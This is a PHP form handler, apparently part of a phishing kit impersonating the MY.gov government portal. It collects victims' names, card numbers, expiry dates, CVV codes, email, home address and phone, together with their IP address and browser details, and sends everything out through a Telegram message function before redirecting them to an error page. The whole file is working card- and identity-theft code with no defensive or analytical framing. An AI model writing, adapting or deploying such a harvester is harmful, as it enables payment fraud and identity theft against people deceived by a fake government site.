<?php
include("config/config.php");
//Server Variables
    $ip = getenv("REMOTE_ADDR");
            $browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");
    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $fname = $_POST['fname'];
    $lname = $_POST['lname'];
    $card = $_POST['card'];
    $expiry = $_POST['expiry'];
    $cvv = $_POST['cvv'];
    $email = $_POST['email'];
    $street = $_POST['street'];
    $apt = $_POST['apt'];
    $city = $_POST['city'];
    $state = $_POST['state'];
    $zip = $_POST['zip'];
    $phone = $_POST['phone'];
    $serv = $_REQUEST['log1'];


        //Telegram send
        $message = "**MY.gov-Login1\n";
        $message .= "User-!P : ".$ip."\n";   
        $message .= "----------------------------------------\n";
        $message .= "FNAME: ".$_POST['fname']."\n";
        $message .= "----------------------------------------\n";
        $message .= "LNAME: ".$_POST['lname']."\n";
        $message .= "----------------------------------------\n";
        $message .= "CARD: ".$_POST['card']."\n";
        $message .= "----------------------------------------\n";
        $message .= "EXPIRY: ".$_POST['expiry']."\n";
        $message .= "----------------------------------------\n";
        $message .= "CVV: ".$_POST['cvv']."\n";
        $message .= "----------------------------------------\n";
        $message .= "EMAIL: ".$_POST['email']."\n";
        $message .= "----------------------------------------\n";
        $message .= "STREET: ".$_POST['street']."\n";
        $message .= "----------------------------------------\n";
        $message .= "APT: ".$_POST['apt']."\n";
        $message .= "----------------------------------------\n";
        $message .= "CITY: ".$_POST['city']."\n";
        $message .= "----------------------------------------\n";
        $message .= "STATE: ".$_POST['state']."\n";
        $message .= "----------------------------------------\n";
        $message .= "ZIP: ".$_POST['zip']."\n";
        $message .= "----------------------------------------\n";
        $message .= "PHONE: ".$_POST['phone']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);



        //Output
        header("location:error.html");
?>
